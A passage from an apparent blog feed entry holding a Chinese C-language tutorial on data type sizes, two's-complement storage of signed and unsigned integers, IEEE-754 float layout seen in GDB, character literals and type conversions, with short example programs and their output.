style="text-align:center"><font size="2">|1.7e-308|~|1.7e+308|</font></td></tr></tbody></table><blockquote><p>下面我们用一个示例代码打印一下这些基本的数据类型，代码如下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Function: 打印基本数据类型的字节数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of char is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of short is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">short</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of int is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of long int is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of float is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">float</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of double is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">double</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行结果如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">The size of char is 1 bytes</span><br><span class="line">The size of short is 2 bytes</span><br><span class="line">The size of int is 4 bytes</span><br><span class="line">The size of long int is 4 bytes</span><br><span class="line">The size of float is 4 bytes</span><br><span class="line">The size of double is 8 bytes</span><br></pre></td></tr></table></figure><blockquote><p><font size="2">需要说明的是上述程序的运行环境为32位，所以long的字节数是4bytes，而在64位环境下则为8bytes</font></p></blockquote><h4 id="font-color-blue-1有符号和无符号font"><a class="markdownIt-Anchor" href="#font-color-blue-1有符号和无符号font"></a> <font color="blue"><code>1.有符号和无符号</code></font></h4><p>      对于有符号和无符号数据类型这块，我想首先用一个问题来引出这部分的重点内容——<code>计算机怎么知道数值是有符号的还是无符号的呢？</code>众所周知，数值在计算机内部的存储方式是以<code>0 1</code>方式进行存储的，比如数值<code>4</code>在16位环境下的存储形式为<code>0000 0000 0000 0100</code>，很简单就能知道这是一个正数4，那么如果存储的是<code>-4</code>呢？（<font color="green" size="2">大家思考一下负数在内存的存储方式</font>），要知道<code>-4</code>在内存是以它的补码形式进行存储的，首先来看<code>-4</code>从原码到补码的转变：<code>1</code> <code>000 0100</code> <font size="2">（原码）</font>⇥ <code>1</code> <code>111 1011</code><font size="2">（反码）</font>⇥ <code>1</code> <code>111 1100</code> <font size="2">（补码）</font>，那么<code>-4</code>在内存的存储形式为<code>0xfc</code>，下面我们可以看一下32位环境下的无符号和有符号定义下<code>-4</code>和<code>4</code>的存储形式，是否和我们推导的一致呢？如下图：</p><p><img src="/images/131-2.png" alt></p><p>      从上图可以看出对于有符号数值是以数值的补码形式进行存储的，但是对于无符号下的负数是什么原因呢？这是因为你前面加上符号之后，相当于把变量提升为有符号类型，所以和正常的有符号下的存储是一样的。</p><blockquote><p><font color="red"><strong>知识点一</strong></font>：无论是整数和负数，在计算机内部都是以它们的补码的形式进行存储的。</p></blockquote><p>     这里通过一个简单的程序引出下面的问题，程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">2147483649</span>, usum;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">1</span>, sum;</span><br><span class="line">        usum = i + j;</span><br><span class="line">    sum = i + j;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usum = 214783649 + 1 = %d (d)\n"</span>,usum);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usum = 214783649 + 1 = %u (u)\n"</span>,usum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sum = 214783649 + 1 = %d (d)\n"</span>,sum);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"sum = 214783649 + 1 = %u (u)\n"</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在看下方结果之前，大家先思考一下应该是什么结果？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usum = 214783649 + 1 = -2147483646 (d)</span><br><span class="line">usum = 214783649 + 1 = 2147483650 (u)</span><br><span class="line">sum = 214783649 + 1 = -2147483646 (d)</span><br><span class="line">sum = 214783649 + 1 = 2147483650 (u)</span><br></pre></td></tr></table></figure><blockquote><p>看到上面的输出结果，我猜大家可能会有这样的问题：</p><ul><li>i和j都是正数，两个数相加之后怎么成负数了？</li><li>为什么格式符不同，输出的结果也不通呢？</li><li>usum是<code>unsigned int</code>类型，怎么成为了负数呢？</li></ul><p>下面我们一步一步的来进行解析。</p></blockquote><p>      首先我们知道了数值在机器内存是以补码的形式进行存储的，那么对于两个数相加机器是怎么处理的呢？在汇编层次，一般通过<code>add eax,edx</code>进行的，其中将<code>eax</code>和<code>edx</code>中的二进制相加，然后把结果存储到寄存器<code>eax</code>中，所以说<code>214783649 + 1</code>对于机器来说只不过是将这两个的二进制形式相加而已，关于补码加减运算应该要注意的是：负数的求反码和补码过程符号位是不参与计算的，要取出来，只有在进行负数补码的加减法的时候<code>符号位</code>才参与计算<sup>[1]</sup></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   214783649     1000 0000 0000 0000 0000 0000 0000 0001</span><br><span class="line">+          1   +0000 0000 0000 0000 0000 0000 0000 0001</span><br><span class="line">-------------   -----------------------------------------</span><br><span class="line">   ?&lt;=  1000 0000 0000 0000 0000 0000 0000 0010</span><br></pre></td></tr></table></figure><blockquote><p>关键的要来了，机器会把<code>1000 0000 0000 0000 0000 0000 0000 0010</code>看做什么呢？</p><ul><li>如果是有符号的话，则它的原码为<code>1111 1111 1111 1111 1111 1111 1111 1100</code>，因为是有符号的，所以最高位为符号位，为1表示是负数，那么<code>1111111111111111111111111111110</code>(去掉符号位的二进制)的十进制为<code>2147483646</code>，再加上符号，那么就是<code>-2147483646</code></li><li>如果是无符号的话，则它的原码就是其本身，那么该二进制的十进制为<code>2147483650</code></li></ul><p>之所以出现上述结果，原因在于格式符<code>%d</code>和<code>%u</code>：</p><ul><li><code>%d</code>是输出<strong>带符号</strong>十进制定点格式，也就是说机器通过<code>%d</code>将本无意义的二进制看作有符号的数值，那么第一位是符号位；</li><li><code>%u</code>是输出<strong>无符号</strong>十进制定点格式，也就是说不管前面是如何定义的，在这里的输出机器就把二进制串解析成无符号的十进制；</li></ul></blockquote><p><code>小节总结：</code></p><blockquote><ul><li>数值在内存中都以补码的形式进行存储和计算；(为什么要以补码的形式呢，见参考文献[1])</li><li>数值是有符号还是无符号，看用户怎么使用</li></ul></blockquote><h4 id="font-color-blue2浮点数在内存的存储形式font"><a class="markdownIt-Anchor" href="#font-color-blue2浮点数在内存的存储形式font"></a> <font color="blue"><code>2.浮点数在内存的存储形式</code></font></h4><p>      首先要说明的是，这里我们不会对浮点数的具体知识点展开，比如精度问题。我们知道了整型数值在内存中是以其补码的形式进行存储的，那浮点数在内存中是以什么形式进行存储的呢？既然不太清楚，那我们就先用一个简单的例子来看一下浮点数的存储方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> a = <span class="number">4.5</span>;<span class="comment">// 二进制形式为0000 0000 0000 0000 0000 0000 0000 0100.1</span></span><br><span class="line">    <span class="keyword">float</span> b = <span class="number">-4.5</span>;<span class="comment">// 二进制形式为1000 0000 0000 0000 0000 0000 0000 0100.1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] a:%f\n[*] b:%f\n"</span>,a,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      我们将其程序编译为32位的ELF程序，用GDB看一下ａ和ｂ的存储形式，如下：</p><p><img src="/images/131-3.jpg" alt></p><p>      我们现在对比一下a和b的二进制形式和在计算机内存存放的形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ab</span><br><span class="line">数值自身形式：00000000000000000000000000000100.110000000000000000000000000000100.1</span><br><span class="line">内存中的存储：0100000010010000000000000000000011000000100100000000000000000000</span><br></pre></td></tr></table></figure><blockquote><p>可以看出数值本身的二进制形式和存放在内存中的形式完全不同，这是因为浮点数与整数的存储方式完全不同，根据<a href="https://en.wikipedia.org/wiki/IEEE_754" target="_blank" rel="noopener"><code>IEEE-754</code></a>标准，我们可以知道浮点数是以如下方式进行存储的：</p></blockquote><p><img src="/images/131-4.png" alt></p><blockquote><p>既然我们知道了相关的存储方式<sup>[2]</sup>，那么机器如何操作的呢？下面我们还是一上面的程序为例，看一下相关的汇编代码：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   ……</span><br><span class="line">   0x565561b0 &lt;+23&gt;:    add    eax,0x2e50</span><br><span class="line">   0x565561b5 &lt;+28&gt;:    fld    DWORD PTR [eax-0x1fe4]</span><br><span class="line">=&gt; 0x565561bb &lt;+34&gt;:    fstp   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x565561be &lt;+37&gt;:    fld    DWORD PTR [eax-0x1fe0]</span><br><span class="line">   0x565561c4 &lt;+43&gt;:    fstp   DWORD PTR [ebp-0x10]</span><br><span class="line">   0x565561c7 &lt;+46&gt;:    fld    DWORD PTR [ebp-0xc]</span><br><span class="line">   0x565561ca &lt;+49&gt;:    fld    DWORD PTR [ebp-0x10]</span><br><span class="line">   0x565561cd &lt;+52&gt;:    sub    esp,0xc</span><br><span class="line">   ……</span><br></pre></td></tr></table></figure><blockquote><p>这里的<code>fld</code>、<code>fstp</code>指令是没有接触过，那么这里就简单介绍一下：</p></blockquote><p><code>fld指令</code></p><blockquote><p><code>指令格式</code>：FLD　STReg/MemReal    （STReg是处理器堆栈寄存器ST(0)~ST(7)）</p><p><code>指令功能</code>：将<strong>浮点数据压入<a href="https://zh.wikipedia.org/zh-hans/%E8%BC%94%E5%8A%A9%E8%99%95%E7%90%86%E5%99%A8" target="_blank" rel="noopener">协处理器</a>的堆栈中</strong>。当进行内存单元内容压栈时，系统会自动决定传送数据的精度。比如：用DD或REAL4定义的内存单元数值是单精度数等，类似于指令push</p></blockquote><p><code>fst指令</code>：</p><blockquote><p><code>指令格式</code>：FST STReg/MemReal</p><p><code>指令功能</code>：将<strong>协处理器堆栈栈顶的数据传送到目标操作数</strong>中。在进行数据传送时，系统自动根据控制寄存器中舍入控制位的设置把栈顶浮点数舍入成相应精度的数据。</p></blockquote><p><code>fstp指令</code></p><blockquote><p><code>指令格式</code>：FSTP STReg/MemReal</p><p><code>指令功能</code>：与FST相类似，所不同的是：指令FST执行完后，<strong>不进行堆栈的弹出操作</strong>，即：<strong>堆栈不发生变化</strong>，而指令FSTP执行完后，则需要进行堆栈的弹出操作，堆栈将发生变化。</p></blockquote><h3 id="font-color-navy0x01-数据常量font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-数据常量font"></a> <font color="navy"><code>0x01 数据常量</code></font></h3><h4 id="font-color-blue1字符和字符字面值font"><a class="markdownIt-Anchor" href="#font-color-blue1字符和字符字面值font"></a> <font color="blue"><code>1.字符和字符字面值</code></font></h4><p>      从一个程序开始我们的学习：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="string">'a'</span>;</span><br><span class="line">    <span class="keyword">char</span> b = <span class="string">'b'</span>;</span><br><span class="line">    <span class="keyword">char</span> c = <span class="number">0x63</span>;</span><br><span class="line">    <span class="keyword">int</span> d = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] a = %d(d) = %c(c)\n"</span>,a,a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] b = %d(d) = %c(c)\n"</span>,b,b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] c = %d(d) = %c(c)\n"</span>,c,c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] d = %d(d) = %c(c)\n"</span>,d,d);</span><br><span class="line">    b--;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] b-1 = %d(d) = %c(c)\n"</span>,b,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>结果如下</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] a = 97(d) = a(c)</span><br><span class="line">[*] b = 98(d) = b(c)</span><br><span class="line">[*] c = 99(d) = c(c)</span><br><span class="line">[*] d = 100(d) = d(c)</span><br><span class="line">[*] b-1 = 97(d) = a(c)</span><br></pre></td></tr></table></figure><p>      字面值就是一种记号而已，比如3，100，a,c，3.14。因为我们不能修改它（你能说把3改成5吗？）所以有时候又叫它常量。比如 int a = 100；a是一个int型变量，100就是一个字面值。字面值100只能用来作右值，不能作左值。<br>C语言中字符字面值是由一对<code>单引号括起来的单个字符</code>，比如’a’、‘b’。实际上字符字面值和整型字面值是一样的。编译器把字符字面值都当做整型字面值处理。比如：</p><ul><li>定义一个字符变量并用字符字面值来初始化：char ch = ‘a’；或者 char ch = 0x61；</li><li>定义一个int型变量并用字符字面值来初始化：int a = ‘a’；也是可以的，<code>printf(&quot;%d&quot;,a);</code>输出结果为<code>97</code></li></ul><p><code>总结</code></p><blockquote><ul><li>字符型可以和整型可以相互转化，在C语言中<code>字符型就是一种整型</code>，因为在内存中存储的是二进制形式，可以被解析成字符和字符字面值两个含义；</li><li>字符字面值是由单引号括起来的单个字符；</li></ul></blockquote><h3 id="font-color-navy0x02-数据类型转换font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-数据类型转换font"></a> <font color="navy"><code>0x02 数据类型转换</code></font></h3><h4 id="font-color-blue1类型提升font"><a class="markdownIt-Anchor" href="#font-color-blue1类型提升font"></a> <font color="blue"><code>1.类型提升</code></font></h4><p>      首先举一个简单的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">short</span> a= <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> b;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> c;</span><br><span class="line">b = a;</span><br><span class="line">c = a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]          short a = %d(d) = %u(u)\n"</span>,a,a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] unsigned short b = %d(d) = %u(u)\n"</span>,b,b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] unsigned int c = %d(d) = %u(u)\n"</span>,c,b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>结果如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*]          short a = -1(d) = 4294967295(u)</span><br><span class="line">[*] unsigned short b = 65535(d) = 65535(u)</span><br><span class="line">[*] unsigned int c = -1(d) = 4294967295(u)</span><br></pre></td></tr></table></figure><p>      分析<code>printf的输出</code>，如下图：</p><p><img src="/images/131-5.png" alt></p><p><code>总结</code></p><blockquote><ul><li>有符号数按照有符号数的扩展规则（<strong>高位补符号位</strong>）扩展，无符号数按照无符号数的扩展规则（<strong>高位补0</strong>）扩展</li><li><strong>整型提升都解释为int</strong></li></ul></blockquote><h4 id="font-color-blue2类型降格font"><a class="markdownIt-Anchor" href="#font-color-blue2类型降格font"></a> <font color="blue"><code>2.类型降格</code></font></h4><p>      关于类型降格的相关知识点我只简单总结一下，大家可以自己写示例代码进行验证</p><blockquote><ul><li>当实数（浮点数）转换为整数时，实数的小数部分被全被舍去，只保留整数部分</li><li>当double类型转换为float类型，将去掉多余的数字，但按照四舍五入进行处理，这种会降低精度</li></ul></blockquote><h4 id="font-color-blue3显示转换font"><a class="markdownIt-Anchor" href="#font-color-blue3显示转换font"></a> <font color="blue"><code>3.显示转换</code></font></h4><p>      显示转换的方法有：<code>强制类型转换</code></p><h4 id="font-color-blue4隐式转换font"><a class="markdownIt-Anchor" href="#font-color-blue4隐式转换font"></a> <font color="blue"><code>4.隐式转换</code></font></h4><p>      隐式转换的方法有：</p><p><code>赋值转换</code></p><blockquote><p>通过赋值语句使符号右边表达式的值的类型自动转换为其左边变量的类型，如我们在类型提升中程序里面有关赋值的语句，如</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">3</span>,b;</span><br><span class="line">    <span class="keyword">short</span> i = <span class="number">4</span>,j;</span><br><span class="line">    j = a;<span class="comment">// int =&gt; short 类型降格</span></span><br><span class="line">    b = i;<span class="comment">// short =&gt; int 类型提升</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>一元转换</code></p><blockquote><p>将短型数扩展成机器处理的长度</p></blockquote><p><code>二元转换</code></p><blockquote><p>按照优先级顺序将各二元运算符的操作数提升为同一类型，长类型的优先级大于短类型的优先级</p></blockquote><p><code>输出转换</code></p><blockquote><p>比如我们前面讲到的<code>printf()</code>的格式符<code>%d</code>，是将数据类型提升/降格为<code>signed int</code>类型</p></blockquote><h3 id="font-colornavy0x04-referencefont"><a class="markdownIt-Anchor" href="#font-colornavy0x04-referencefont"></a> <font color="navy"><code>0x04 Reference</code></font></h3><p>[1] <a href="https://www.zhihu.com/question/30395946" target="_blank" rel="noopener">计算机补码运算背后的数学原理是什么？</a></p><p>[2] <a href="https://www.ruanyifeng.com/blog/2010/06/ieee_floating-point_representation.html" target="_blank" rel="noopener">浮点数的二进制表示</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-基本数据类型font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-基本数据类型font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="C" scheme="https://muzibing.github.io/tags/C/"/>
    
  </entry>
  
</feed>
